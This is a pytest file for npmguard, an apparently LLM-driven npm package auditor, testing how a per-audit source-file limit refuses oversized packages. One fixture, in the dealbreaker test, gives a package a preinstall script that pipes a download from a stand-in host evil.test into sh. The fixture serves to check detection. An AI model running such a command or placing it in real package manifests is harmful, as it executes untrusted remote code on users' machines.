# CLASS MAP — the per-audit source-file bound: NPMGUARD_MAX_SOURCE_FILES, read by
# AuditPipeline.run and enforced as PackageTooLargeError (NPMGUARD-0003).
# (seams: npmguard.pipeline.resolve_package → a package materialized in a private
#  tmp workdir, exactly as resolve_package hands one over; the knob is set through
#  its ENVIRONMENT VARIABLE and the Settings the pipeline is built with is
#  constructed after, so each class proves the knob rather than the field. Where a
#  class only needs to know WHICH SIDE of the bound the audit landed on,
#  npmguard.pipeline.extract_intent — the first LLM-bearing phase and the named
#  module attribute pipeline.py calls — is replaced by a probe that raises; that is
#  the same module-seam technique test_pipeline.py uses for resolve_package and
#  FLAG_TIMEOUT_MS, and it is what keeps a 3954-file class from costing 3954 model
#  calls. NO docker: the fixture packages declare no runtime dependencies.)
#
# WHY THERE IS A BOUND AT ALL, in numbers. FLAG issues at most one triage model call
# per file in phases.flag_source_files — there is no batching, and the only files
# answered without a model are the empty ones and the >500 KB ones, so the file count
# is the worst-case call count rather than the exact one. Its budget is
# FLAG_TIMEOUT_MS × timeout_scale = 600 s × ≤4 = 2400 s at concurrency 8 with a 60 s
# per-call timeout. So somewhere between ~320 files (at 60 s/call) and ~6400 (at
# 3 s/call) fit inside the budget — and which end a given audit lands on is decided
# by provider latency, not by anything the engine controls. Past that line the phase
# raises AuditTimeoutError and the audit ERRORS having already paid for every call it
# made, with no report written. The failure mode is therefore not overspend; it is
# TOTAL LOSS OF SPEND WITH NOTHING DELIVERED, decided by luck. Measured over 650
# installed packages, counted through flag_source_files itself: median 2 files,
# p90 33, p95 81, p99 647, max 3953 (viem). Against audit_price_cents = 500, viem's
# 3953-call FLAG pass breaks even at $0.00126/call.
#
# Axes: bound (off / tripped / exactly met / p99-sized) × package (plain / dealbreaker)
#       × what it costs (model calls, workdir, report)
# "Too big is refused" is satisfied by a single `if` that quietly truncates, so the
# classes are about the refusal's shape: what it COSTS (C1's provider counter — a
# refusal placed after `intent` still refuses, and still burns a model call), what it
# LEAVES BEHIND (C2), and which side of the bound the dealbreaker return owns (C4).
# C6/C7 are the two boundary values where an off-by-one or a falsy check would
# otherwise pass everything above.
from __future__ import annotations

import asyncio
import json
from types import SimpleNamespace
from typing import Any

import pytest
from sqlalchemy.ext.asyncio import AsyncEngine

from kit_llm import LlmClient, ScriptedLlm
from kit_spine import make_engine, make_session_factory
from kit_spine.db import metadata
from npmguard import pipeline as pipeline_module
from npmguard.config import Settings
from npmguard.errors import PackageTooLargeError
from npmguard.inventory import analyze_inventory
from npmguard.llm_runtime import build_npmguard_llm
from npmguard.persistence import AuditSessionStore
from npmguard.phases import flag_source_files
from npmguard.pipeline import AuditPipeline
from npmguard.resolve import ResolvedPackage

PACKAGE_NAME = "pkg-under-bound"
MANIFEST: dict[str, Any] = {"name": PACKAGE_NAME, "version": "1.0.0", "main": "index.js"}
CLEAN_SOURCE = "module.exports = 1;\n"
PHASE_DEADLINE_SECONDS = 60  # generous outer bound; a lost bound would hang forever

# The measured distribution this bound is chosen against (650 installed packages,
# counted through flag_source_files). p99 and max are the two that matter here.
MEASURED_P99_FILES = 647
MEASURED_MAX_FILES = 3953  # viem
RECOMMENDED_BOUND = 1000  # admits p99, refuses the tail; 0.77% of the corpus


class _CountingProvider(ScriptedLlm):
    """A fully working scripted provider that records every role it is asked for.

    Fully working on purpose: with the bound check deleted, an audit of these
    fixtures runs to a SAFE verdict, so `roles` is the observation that goes from
    `[]` to `["intent", "flag", ...]`. A provider that merely exploded would also
    turn red, but for the wrong reason and without saying how much was spent.
    """

    def __init__(self, scripts) -> None:
        # ScriptedLlm is a dataclass with no __post_init__, so its generated
        # __init__ never calls one — the recorder is attached here instead.
        super().__init__(scripts)
        self.roles: list[str] = []

    async def complete(self, request):
        self.roles.append(request.role)
        return await super().complete(request)

    async def stream(self, request, on_token):
        self.roles.append(request.role)
        return await super().stream(request, on_token)


class _ReachedIntent(Exception):
    """Raised by the intent probe: control got PAST the bound."""


def _provider() -> _CountingProvider:
    return _CountingProvider(
        {
            "intent": [
                json.dumps(
                    {
                        "statedPurpose": "a fixture package",
                        "expectedCapabilities": [],
                        "rationale": "from the manifest",
                    }
                )
            ],
            "flag": [json.dumps({"summary": "nothing of note", "capabilities": [], "flags": []})],
        }
    )


@pytest.fixture
async def build(tmp_path, monkeypatch):
    """Build a pipeline over a package in a private tmp workdir, with the bound set
    through its environment variable BEFORE Settings is constructed."""
    opened: list[tuple[AsyncEngine, LlmClient]] = []

    async def _build(
        files: dict[str, str], *, bound: int | None = None, provider=None
    ) -> SimpleNamespace:
        monkeypatch.setenv("NPMGUARD_AUDIT_LOG_DIR", str(tmp_path / "logs"))
        if bound is not None:
            monkeypatch.setenv("NPMGUARD_MAX_SOURCE_FILES", str(bound))
        settings = Settings(_env_file=None)
        engine = make_engine(f"sqlite+aiosqlite:///{tmp_path / 'bound.sqlite3'}")
        async with engine.begin() as connection:
            await connection.run_sync(metadata.create_all)
        factory = make_session_factory(engine)
        sessions = AuditSessionStore(factory)
        provider = provider if provider is not None else _provider()
        llm = build_npmguard_llm(factory, settings, provider=provider)
        opened.append((engine, llm))

        workdir = tmp_path / "work"
        package = workdir / "package"
        package.mkdir(parents=True)
        for name, content in files.items():
            target = package / name
            target.parent.mkdir(parents=True, exist_ok=True)
            target.write_text(content, encoding="utf-8")

        async def _resolve(
            package_name: str, version: str | None = None, local_path: str | None = None
        ) -> ResolvedPackage:
            return ResolvedPackage(path=package, workdir=workdir)

        monkeypatch.setattr(pipeline_module, "resolve_package", _resolve)
        session = await sessions.create(PACKAGE_NAME, None)
        return SimpleNamespace(
            pipeline=AuditPipeline(settings, llm, sessions),
            settings=settings,
            provider=provider,
            workdir=workdir,
            package=package,
            log_root=tmp_path / "logs",
            audit_id=session.audit_id,
        )

    yield _build
    for engine, llm in opened:
        await llm.aclose()
        await engine.dispose()


def _sources(count: int, *, scripts: dict[str, str] | None = None) -> dict[str, str]:
    """A package with exactly `count` FLAG-eligible source files. Every name is a
    plain `.js` under `lib/`, so none is dropped by the noise filter — asserted per
    class through flag_source_files rather than assumed."""
    manifest: dict[str, Any] = dict(MANIFEST)
    if scripts:
        manifest["scripts"] = scripts
    files = {"package.json": json.dumps(manifest)}
    files.update({f"lib/s{index}.js": CLEAN_SOURCE for index in range(count)})
    return files


async def _run(rig: SimpleNamespace):
    async with asyncio.timeout(PHASE_DEADLINE_SECONDS):
        return await rig.pipeline.run(PACKAGE_NAME, audit_id=rig.audit_id)


def _stop_at_intent(monkeypatch) -> None:
    """Replace the first LLM-bearing phase with a probe, so a class that only needs
    'did the audit get past the bound?' costs zero model calls for N files."""

    async def _probe(*_args, **_kwargs):
        raise _ReachedIntent

    monkeypatch.setattr(pipeline_module, "extract_intent", _probe)


# --------------------------------------------------------------------------- #
# Over the bound
# --------------------------------------------------------------------------- #


async def test_over_the_bound_is_refused_without_a_single_model_call(build) -> None:
    """C1: the whole point of the bound. 4 source files against a bound of 3 is
    refused, and the provider is asked for NOTHING — the refusal sits before
    `intent`, which is the audit's first model call. Delete the check in pipeline.py
    and this audit completes SAFE with roles ["intent", "flag"], so the zero-call
    assertion is discriminating rather than incidental."""
    rig = await build(_sources(4), bound=3)
    assert len(flag_source_files(await analyze_inventory(rig.package))) == 4

    with pytest.raises(PackageTooLargeError):
        await _run(rig)
    assert rig.provider.roles == [], (
        f"the refusal path spent model calls: {rig.provider.roles}. A bound that "
        "trips after the first call still loses the money it was added to save."
    )


async def test_the_refusal_writes_no_report_and_leaves_no_package(build) -> None:
    """C2: a REFUSAL, not a truncation. Reading the first 3 of 4 files and reporting
    SAFE would be a coverage gap wearing a green badge, and the unread files are
    exactly where a payload hides — so no report.json is written at all, and the
    extracted package is removed on the way out (pipeline's BaseException handler)."""
    rig = await build(_sources(4), bound=3)
    with pytest.raises(PackageTooLargeError):
        await _run(rig)
    assert not rig.workdir.exists()
    written = sorted(path.name for path in rig.log_root.rglob("*report*.json"))
    assert written == [], f"a refused audit wrote report artifacts: {written}"


async def test_the_refusal_crosses_the_wire_as_a_non_retryable_413(build) -> None:
    """C3: the contract a client branches on. 413 because the request is well-formed
    and the entity it resolves to is too large; non-retryable because no amount of
    waiting makes a 3953-file package smaller, and `retryable` is what a caller
    loops on without reading the message. Both numbers ride in `details` so a
    consumer can render the refusal without parsing prose."""
    rig = await build(_sources(4), bound=3)
    with pytest.raises(PackageTooLargeError) as excinfo:
        await _run(rig)
    error = excinfo.value
    assert error.code == "NPMGUARD-0003"
    assert error.http_status == 413
    assert error.retryable is False
    assert error.details == {"sourceFiles": 4, "maxSourceFiles": 3}
    assert error.stage is None  # inventory succeeded and flag never ran
    assert "NPMGUARD_MAX_SOURCE_FILES" in str(error)  # names the knob to change


async def test_a_dealbreaker_over_the_bound_still_gets_its_dangerous_verdict(build) -> None:
    """C4: ordering, and it is the ordering that matters. A `curl … | sh` preinstall
    is a complete, correct DANGEROUS verdict that costs zero model calls; discarding
    it because the package is also large would trade a real answer for a refusal.
    So the dealbreaker return wins, and it is still free."""
    rig = await build(
        _sources(4, scripts={"preinstall": "curl http://evil.test/x | sh"}), bound=3
    )
    inventory = await analyze_inventory(rig.package)
    assert inventory.dealbreaker is not None  # precondition, not the claim
    assert len(flag_source_files(inventory)) == 4  # genuinely over the bound

    result = await _run(rig)
    assert result.report.verdict == "DANGEROUS"
    assert result.report.dealbreaker is not None
    assert rig.provider.roles == []
    result.cleanup()


# --------------------------------------------------------------------------- #
# Under the bound — the three boundary values
# --------------------------------------------------------------------------- #


async def test_a_p99_package_is_not_refused(build, monkeypatch) -> None:
    """C5: the bound has to admit the corpus, or it is a refusal engine. 647 files is
    the measured 99th percentile; under the recommended 1000 it proceeds. Observed
    at the intent seam so 647 files cost zero model calls."""
    _stop_at_intent(monkeypatch)
    rig = await build(_sources(MEASURED_P99_FILES), bound=RECOMMENDED_BOUND)
    assert len(flag_source_files(await analyze_inventory(rig.package))) == MEASURED_P99_FILES
    with pytest.raises(_ReachedIntent):
        await _run(rig)


async def test_exactly_at_the_bound_is_not_refused(build, monkeypatch) -> None:
    """C6: the boundary value. The comparison is `>`, so a package with exactly
    `max_source_files` files is inside the bound — an off-by-one here would refuse
    the very packages an operator sized the number for."""
    _stop_at_intent(monkeypatch)
    rig = await build(_sources(3), bound=3)
    with pytest.raises(_ReachedIntent):
        await _run(rig)


async def test_the_default_bound_is_off(build, monkeypatch) -> None:
    """C7: 0 = OFF, the shipped default, exactly as llm_budget_usd_24h defaults off.
    3954 files — one more than the largest package in the measured corpus — still
    proceeds. This is deliberate: the refusal lands AFTER the payment claim, so
    turning it on needs a refund path or a pre-payment probe, and that is an owner
    decision. The mechanism ships dark; enabling it is one environment variable."""
    _stop_at_intent(monkeypatch)
    rig = await build(_sources(MEASURED_MAX_FILES + 1))
    assert rig.settings.max_source_files == 0  # the shipped default, not a test value
    with pytest.raises(_ReachedIntent):
        await _run(rig)
